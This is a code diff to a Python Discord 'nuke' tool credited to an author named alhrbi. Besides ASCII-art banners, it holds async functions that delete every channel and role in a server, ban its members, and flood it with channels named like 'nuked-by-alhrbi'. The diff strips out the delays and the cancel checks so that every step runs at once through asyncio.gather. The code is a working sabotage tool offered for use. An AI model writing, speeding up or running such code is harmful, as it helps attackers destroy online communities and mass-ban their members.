@@ -41,6 +41,7 @@ def printc(text, color=YELLOW):
 def inp(prompt):
     return input(YELLOW + prompt)
 
+# ===== ASCII ART =====
 LOGO_MAIN = r"""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣟⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -91,48 +92,48 @@ LOGO_MAIN = r"""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠇⠀  githun.com/5cxx
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡁⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡁
 """
 
 DRAGON = r"""
-                    ⢀⡀⠤⠤⠠⡖⠲⣄⣀
-                    ⡠⠶⣴⣶⣄⠀⢀⣴⣞⣼⣴⣖⣶⣾⡷⣶⣿⣿⣷⢦⡀
-                    ⢸⠀⠙⢟⠛⠴⣶⣿⣿⠟⠙⣍⠑⢌⠙⢵⣝⢿⣽⡮⣎⢿⡦⡀
-                    ⢸⠀⠀⠀⢱⡶⣋⠿⣽⣸⡀⠘⣎⢢⡰⣷⢿⣣⠹⣿⢸⣿⢿⠿⡦⣄
-                    ⢸⠀⠀⠀⢧⡿⣇⡅⣿⣇⠗⢤⣸⣿⢳⣹⡀⠳⣷⣻⣼⢿⣯⡷⣿⣁⠒⠠⢄⡀⠁
-                    ⠈⠀⠀⠀⣼⣿⣧⡏⣿⣿⢾⣯⡠⣾⣸⣿⡿⣦⣙⣿⢹⡇⣿⣷⣝⠿⣅⣂⡀⠡⢂⠄⣀
-                    ⠇⠀⠀⣿⡟⣿⡇⡏⣿⣽⣿⣧⢻⡗⡇⣇⣤⣿⣿⣿⣧⣿⣿⡲⣭⣀⡭⠛⠁⣨⠁⠉⣂⢄
-                    ⠸⠀⠀⢻⣿⣇⣥⣏⣘⣿⣏⠛⠻⣷⠿⡻⡛⠷⡽⡿⣿⣿⣿⣷⠟⠓⠉⠢⢄⡀⢠⠇⠀⠁⠫⢢
-                    ⢇⠀⢸⣾⣿⣽⣿⣏⣻⠻⠁⢠⠁⠀⠘⣰⣿⣿⢟⢹⢻⠀⠀⠀⠈⠒⢄⡀⠀⠀⠀⠑⢄
-                    ⡄⠀⢸⣯⣿⣿⣿⢷⡀⠀⠀⠀⠀⠀⠛⣩⣿⣿⢿⣾⣸⠀⠀⠀⠀⠀⡤⡞⠉⠉⠁⠀⢀⠌
-                    ⢡⠀⢟⣿⣯⡟⠿⡟⢇⡀⠀⠀⠐⠁⢀⢴⠋⡼⢣⣿⣻⡏⠀⠠⣀⣠⠴⠛⠁⠀⠀⢀⡤⠂
-                    ⠇⠀⠈⠊⢻⣿⣜⡹⡀⠈⠱⠂⠤⠔⠡⢶⣽⡷⢟⡿⠕⠛⠉⠉⠁⠀⠀⠀⠀⡠⠐⠁
-                    ⡄⠀⠀⢿⠿⠿⢿⠾⣽⡀⠀⠀⠀⠈⠻⣥⣃⠀⠀⠀⠀⠀⠀⣀⠤⠒⠁
-                    ⠰⡀⡀⠀⠀⠀⠀⠀⠈⠻⣖⠂⠀⠀⠀⠙⠳⣤⣠⠀⣀⠤⠒⠉
-                    ⠘⠵⡐⠄⠀⠀⠀⠀⠀⠈⢷⣄⡀⠀⠠⡀⠈⠙⠶⣖⡉⡄
-                    ⠈⡥⠈⠂⠀⠀⠀⠀⠀⣼⣿⡿⣶⣄⠈⠣⡀⠀⠈⣿⣧⣄
-                    ⠘⡄⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⡄⠈⠄⠀⠰⠁⢿⣿⣷⣄
-                    ⠘⡄⠀⠀⠀⢠⣿⣿⣯⣿⣿⣿⣿⣿⡄⢸⢀⠃⠀⢸⣿⣿⣽⣧
-                    ⠘⡄⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⢥⠀⠀⣽⣿⣿⣿⡿
-                    ⢰⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢀⣼⣿⣿⣿⡿⠃
-                    ⡀⠸⠉⠃⠁⠈⠉⠙⠛⠿⠿⠽⠿⠟⠛⠉⠛⡲⣿⣿⠿⡿⠟⠁
-                    ⣀⠤⠒⠈⠉⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢠⡏⠁
-                    ⠁⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⣠⡟
-                    ⠀⠀⠀⠀⠀⡰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢔⠏⠀⠀⠀⠄
-                    ⠀⠀⠀⢀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⡀⠀⠀⠄⠀⠐⠁
-                    ⠀⡠⠒⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠠
-                    ⢀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠀⠀⠀⣃⠀⠀⠀⠀⠀⠀⠀⠂
-                    ⡠⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢫⡄⠀⠀⠀⠀⠀⠂
-                    ⣰⡿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣸⣧⡂⠀⠀⠀⡀
-                    ⣼⠏⣸⣿⣷⢷⠙⣻⢶⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠉⣿⣆
-                    ⠰⣏⠀⣿⣿⡘⣼⡇⠀⠁⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠁⠀⣽⣿⡇
-                    ⢙⠓⠛⠘⣧⠾⢷⣄⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⣿⢟⢇⠂
-                    ⠸⠀⠀⠀⢸⣧⠀⠹⣆⠀⠀⠀⠀⠈⢻⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⣿⢂⠙⢿⡷⣧⡀
-                    ⢃⠀⠀⠈⠙⠀⠀⠻⡄⠀⠀⠀⠀⠸⡀⠹⠀⠀⠀⠀⠀⠀⠀⠀⡾⠐⠠⠻⠬⠄⡒
-                    ⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⡇
-                    ⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⢠⠁
-                    ⠐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠀⠀⠀⠀⠀⠀⠀⡈
-                    ⠑⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡀⠀⠀⠀⠀⠀⢀⠃
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣛⣛⣟⢩⣍⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣯⣿⣿⣿
+⣿⣿⣿⣿⣿⢟⣉⠋⠉⠻⣿⣿⣿⡿⠋⠡⠃⠋⠩⠉⠁⢈⠉⠀⠀⠈⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣶⣿⣿⣿⣿
+⣿⣿⣿⣿⡇⣿⣿⣿⣦⡠⣤⣋⠉⠀⠀⣠⣦⠲⣮⡳⣦⡊⠢⡀⠂⢑⠱⡀⢙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣽⣾⣿⣿⣿⣿
+⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡎⢉⠴⣀⠂⠇⢿⣧⠱⡝⢏⠈⡀⠜⣆⠀⡇⠀⡀⣀⢙⠻⣿⣿⣿⣿⣿⣿⢟⣿⣿⣽⣽⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡘⢀⠸⢺⠀⠸⣨⡛⠇⠀⡌⠆⢿⣌⠈⠄⠃⡀⠐⢈⠀⠾⣭⣟⡻⢿⣿⣿⢿⣿⣾⣻⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⠃⠀⠘⢰⠀⠀⡁⠐⢟⠁⠇⠀⢀⠙⠦⠀⡆⢸⠀⠈⠢⣀⠺⠽⢿⣿⣞⡽⣻⠷⣿⣻⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⠀⢠⠀⢸⢰⠀⠂⠀⠘⡄⢨⢸⠸⠛⠀⠀⠀⠘⠀⠀⢍⠒⠿⢒⣤⣾⣿⣿⠗⣾⣶⠽⡻⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣇⣿⣿⣿⣿⡄⠀⠸⠚⠰⠧⠀⠰⣤⣄⠈⣀⢄⢤⣈⢂⢀⠀⠀⠀⠈⣠⣬⣶⣝⡻⢿⡟⣸⣿⣿⣿⣾⣔⡝⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⡸⣿⣿⣿⡇⠁⠀⠂⠀⠰⠄⣄⣾⡟⣾⣿⣿⣿⣧⠏⠀⠀⡠⡆⡄⣿⣿⣿⣿⣿⣷⢭⡻⢿⣿⣿⣿⣿⣿⣿⣮⡻
+⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⡇⠐⠀⠀⠀⡈⢿⣿⣿⣿⣿⣿⣿⣿⣤⠖⠀⠀⡀⠁⠇⣿⣿⣿⣿⣿⣿⠺⢟⣥⣶⣶⣾⣿⣿⣿⡿⣳
+⣿⣿⣿⣿⣿⣿⣿⡞⣿⣿⣿⡠⠀⠐⢠⣀⢠⡸⢿⣿⣿⣯⣾⡿⡋⣴⢃⡜⠀⠄⢰⣿⣿⣿⠿⣻⣽⣾⣿⣿⣿⣿⣿⣿⡿⢛⣽⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣷⣵⡄⠀⠣⢆⢿⣷⣎⣽⣛⣫⣞⡉⠂⢈⡠⢀⣪⣭⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⢟⣯⣾⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⡀⣀⣀⡀⣁⠂⢿⣿⣿⣿⣷⣄⠚⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣭⣾⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⢿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠩⣽⣟⣯⣴⣿⣦⣌⠛⠟⣿⣿⣿⠿⣛⣭⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣊⢯⣻⣿⣿⣿⣿⣿⣿⣿⣷⡈⠻⢿⣿⣟⢿⣿⣷⣦⣉⠩⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢚⣷⣽⣿⣿⣿⣿⣿⣿⣿⠃⣶⣦⣍⠻⣷⣜⢿⣿⣿⣷⡄⢙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⣿⡟⣸⣿⣿⣿⣷⠈⢻⣷⣻⣿⣿⣿⡘⣿⣮⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⢿⣿⡟⠀⠛⠛⠉⠉⠁⠀⠀⢻⡇⣿⣿⣿⡇⠻⠛⠃⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣸⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⣿⣿⣿⠃⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣶⣾⣿⣷⣶⣦⣤⣀⣀⣂⣀⣠⣤⢶⣤⣍⠀⠀⣀⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢸⣿⣿⡟⢰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣴⣿⣿⠟⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡫⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣭⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣻⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⡿⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣵⣿⣿⣿⣿⣿⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⢟⠄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⡔⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⠏⢀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⠃⣰⠇⠀⠈⡈⣦⠄⡉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣁⣶⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣏⠰⣿⠀⠀⢧⠃⢸⣿⣾⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣿⣿⠂⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⡦⣬⣤⣧⠘⣁⡈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⠀⡠⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣇⣿⣿⣿⡇⠘⣿⣆⠹⣿⣿⣿⣿⣷⡄⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⡽⣦⡀⢈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⡼⣿⣿⣷⣦⣿⣿⣄⢻⣿⣿⣿⣿⣇⢿⣆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣯⣟⣿⣄⣓⣻⢭⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣷⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣯⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣮⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 """
 
 FACE = r"""
@@ -159,8 +160,8 @@ FACE = r"""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢻⣿⣿⣿⣿⣿⡇⠀⠀⠈⠉⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠀⠀⠀⠀⠀⠀⠀
 ⠀⣠⣴⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠹⢿⣿⣿⢿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
 ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣶⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣧⣄⣐⣀⣀⣀⣀⣀⡀
-⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁
+⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉ 
 """
 
 BYE = r"""
@@ -227,30 +228,22 @@ ALHRBI_ART = r"""
                     ⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⢀⠈⡀⢀⠁⡀⢀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⢀⣠⠤⠞⠁⢀⣤⠶⠒⠒⠚⠁⠀⠀⠀⠀⠀⠀⠀⠳⠝⠻⠚⡄⠀⣠⣼⣷⡇⠠⢈⠄⣀⠂⠄⠀⠀⠀⠀⠀⣀⠀⣀⠀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⢂⠐⠀⠀⠈⢀⠀⠀
 """
 
-async def type_art(art, speed=0.001):
-    lines = art.split('\n')
-    for line in lines:
-        if line.strip():
-            print(YELLOW + line)
-            await asyncio.sleep(speed)
-    print()
-
 async def show_art(choice):
     if choice in ['1', '2', '3', '4', '5', '6']:
         print(YELLOW + "=" * 60)
-        await type_art(DRAGON, 0.0005)
+        print(YELLOW + DRAGON)
         print(YELLOW + "=" * 60)
     elif choice in ['7', '8']:
         print(YELLOW + "=" * 60)
-        await type_art(FACE, 0.0005)
+        print(YELLOW + FACE)
         print(YELLOW + "=" * 60)
     elif choice == '9':
         print(YELLOW + "=" * 60)
-        await type_art(BYE, 0.001)
+        print(YELLOW + BYE)
         print(YELLOW + "=" * 60)
     elif choice == 'alhrbi':
         print(YELLOW + "=" * 60)
-        await type_art(ALHRBI_ART, 0.0005)
+        print(YELLOW + ALHRBI_ART)
         print(YELLOW + "=" * 60)
 
 def print_logo():
@@ -261,6 +254,8 @@ def print_logo():
     print(YELLOW + "by : MaybeRayan")
     print(YELLOW + "Owner : mayberayanalhrbi")
     print(YELLOW + "=" * 60)
+
+# ===== FAST FUNCTIONS (NO DELAY) =====
 
 async def del_channel(ch):
     try:
@@ -310,62 +305,38 @@ async def send_msg(ch, msg):
     except:
         return False
 
+# ===== NUKE - FAST VERSION =====
+
 async def nuke_guild(g):
     global cancel
     reset_cancel()
     
     printc("[+] Deleting all channels...")
-    task = asyncio.create_task(wait_cancel())
     chs = list(g.channels)
     if chs:
-        for ch in chs:
-            if check_cancel():
-                break
-            await del_channel(ch)
-            await asyncio.sleep(0.05)
-    task.cancel()
+        await asyncio.gather(*[del_channel(ch) for ch in chs], return_exceptions=True)
     printc("[+] Channels deleted")
     
     printc("[+] Deleting all roles...")
-    reset_cancel()
-    task = asyncio.create_task(wait_cancel())
     roles = [r for r in g.roles if r.name != "@everyone" and r < g.me.top_role]
     if roles:
-        for r in roles:
-            if check_cancel():
-                break
-            await del_role(r)
-            await asyncio.sleep(0.05)
-    task.cancel()
+        await asyncio.gather(*[del_role(r) for r in roles], return_exceptions=True)
     printc("[+] Roles deleted")
     
     printc("[+] Banning all members...")
-    reset_cancel()
-    task = asyncio.create_task(wait_cancel())
     members = [m for m in g.members if m != g.me and m != g.owner and m.top_role < g.me.top_role]
     if members:
-        for m in members:
-            if check_cancel():
-                break
-            await ban_member(m)
-            await asyncio.sleep(0.02)
-    task.cancel()
+        await asyncio.gather(*[ban_member(m) for m in members], return_exceptions=True)
     printc("[+] Members banned")
     
     printc("[+] Creating new channels...")
-    reset_cancel()
-    task = asyncio.create_task(wait_cancel())
     channel_names = ["alhrbi", "nuked-by-alhrbi", "alhrbi-was-here", "maybe-alhrbi", "alhrbi-community"]
-    for i in range(50):
-        if check_cancel():
-            break
-        name = random.choice(channel_names)
-        await create_ch(g, name)
-        await asyncio.sleep(0.05)
-    task.cancel()
+    await asyncio.gather(*[create_ch(g, random.choice(channel_names)) for _ in range(50)], return_exceptions=True)
     printc("[+] Channels created")
     
     reset_cancel()
+
+# ===== FAST HANDLERS =====
 
 async def handle_delete_channels(g):
     global cancel
@@ -377,21 +348,9 @@ async def handle_delete_channels(g):
         printc("[X] No channels found")
         inp("Press Enter...")
         return
-    printc(f"[+] Found {len(chs)} channels")
-    task = asyncio.create_task(wait_cancel())
-    tasks = []
-    cancelled = False
-    for ch in chs:
-        if check_cancel():
-            cancelled = True
-            break
-        tasks.append(del_channel(ch))
-        await asyncio.sleep(0.05)
-    if tasks:
-        await asyncio.gather(*tasks, return_exceptions=True)
-    task.cancel()
-    reset_cancel()
-    printc("[!] Cancelled" if cancelled else "[+] All channels deleted")
+    printc(f"[+] Found {len(chs)} channels - Deleting FAST...")
+    await asyncio.gather(*[del_channel(ch) for ch in chs], return_exceptions=True)
+    printc("[+] All channels deleted!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -405,21 +364,9 @@ async def handle_delete_roles(g):
         printc("[X] No roles found")
         inp("Press Enter...")
         return
-    printc(f"[+] Found {len(roles)} roles")
-    task = asyncio.create_task(wait_cancel())
-    tasks = []
-    cancelled = False
-    for r in roles:
-        if check_cancel():
-            cancelled = True
-            break
-        tasks.append(del_role(r))
-        await asyncio.sleep(0.05)
-    if tasks:
-        await asyncio.gather(*tasks, return_exceptions=True)
-    task.cancel()
-    reset_cancel()
-    printc("[!] Cancelled" if cancelled else "[+] All roles deleted")
+    printc(f"[+] Found {len(roles)} roles - Deleting FAST...")
+    await asyncio.gather(*[del_role(r) for r in roles], return_exceptions=True)
+    printc("[+] All roles deleted!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -432,21 +379,9 @@ async def handle_create_channels(g):
     if not count.isdigit():
         return
     count = int(count)
-    task = asyncio.create_task(wait_cancel())
-    tasks = []
-    cancelled = False
-    for i in range(count):
-        if check_cancel():
-            cancelled = True
-            break
-        name = random.choice(NAMES)
-        tasks.append(create_ch(g, name))
-        await asyncio.sleep(0.05)
-    if tasks:
-        await asyncio.gather(*tasks, return_exceptions=True)
-    task.cancel()
-    reset_cancel()
-    printc("[!] Cancelled" if cancelled else f"[+] Created {count} channels")
+    printc(f"[+] Creating {count} channels FAST...")
+    await asyncio.gather(*[create_ch(g, random.choice(NAMES)) for _ in range(count)], return_exceptions=True)
+    printc(f"[+] Created {count} channels!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -460,22 +395,9 @@ async def handle_rename_channels(g):
         printc("[X] No channels found")
         inp("Press Enter...")
         return
-    printc(f"[+] Found {len(chs)} channels")
-    task = asyncio.create_task(wait_cancel())
-    tasks = []
-    cancelled = False
-    for ch in chs:
-        if check_cancel():
-            cancelled = True
-            break
-        name = random.choice(NAMES)
-        tasks.append(rename_ch(ch, name))
-        await asyncio.sleep(0.05)
-    if tasks:
-        await asyncio.gather(*tasks, return_exceptions=True)
-    task.cancel()
-    reset_cancel()
-    printc("[!] Cancelled" if cancelled else f"[+] Renamed {len(chs)} channels")
+    printc(f"[+] Renaming {len(chs)} channels FAST...")
+    await asyncio.gather(*[rename_ch(ch, random.choice(NAMES)) for ch in chs], return_exceptions=True)
+    printc(f"[+] Renamed {len(chs)} channels!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -500,26 +422,9 @@ async def handle_rename_custom(g):
         printc("[X] No valid names")
         inp("Press Enter...")
         return
-    printc(f"[+] Using {len(names)} names")
-    printc(f"[+] Renaming {len(chs)} channels...")
-    task = asyncio.create_task(wait_cancel())
-    tasks = []
-    cancelled = False
-    done = 0
-    for i, ch in enumerate(chs):
-        if check_cancel():
-            cancelled = True
-            break
-        new_name = names[i % len(names)]
-        tasks.append(rename_ch(ch, new_name))
-        done += 1
-        await asyncio.sleep(0.05)
-    if tasks:
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        done = sum(1 for r in results if r == True)
-    task.cancel()
-    reset_cancel()
-    printc("[!] Cancelled" if cancelled else f"[+] Renamed {done} channels")
+    printc(f"[+] Renaming {len(chs)} channels FAST...")
+    await asyncio.gather(*[rename_ch(ch, names[i % len(names)]) for i, ch in enumerate(chs)], return_exceptions=True)
